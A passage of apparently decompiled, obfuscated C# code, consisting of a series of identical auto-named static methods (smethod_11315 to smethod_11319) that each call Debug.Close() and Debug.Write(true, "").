		Debug.Write(true, "");
	}

	internal static void smethod_11315()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11316()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11317()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11318()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11319()
	{
		Debug.Close();
		Debug.Write(true, "");
	}
}
